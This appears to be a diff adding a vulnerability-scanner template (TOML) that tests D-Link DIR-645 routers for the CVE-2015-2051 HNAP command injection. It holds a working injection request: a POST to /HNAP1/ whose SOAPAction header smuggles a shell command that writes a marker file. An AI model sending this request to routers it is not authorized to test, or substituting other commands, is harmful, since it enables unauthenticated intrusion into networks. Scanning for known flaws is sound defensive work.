@@ -1,0 +1,28 @@
+[info]
+author = "ave"
+description = "检测 D-Link DIR-645 路由器是否存在 HNAP GetDeviceSettings 命令注入漏洞。该漏洞允许攻击者通过构造恶意的 SOAPAction 请求头，绕过认证并在目标路由器上执行任意系统命令。"
+id = "POC-AVE-2015-0206"
+name = "CVE-2015-2051 D-Link DIR-645 HNAP Command Injection PoC"
+severity = "critical"
+tags = ["ave-2015-0206"]
+vuln_id = [
+    "CVE-2015-2051",
+    "AVE-2015-0206",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/HNAP1/"
+protocol = "http"
+
+[poc.requests.headers]
+SOAPAction = "http://purenetworks.com/HNAP1/GetDeviceSettings/1;echo vulnerable > /tmp/dlink_test;"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["vulnerable"]
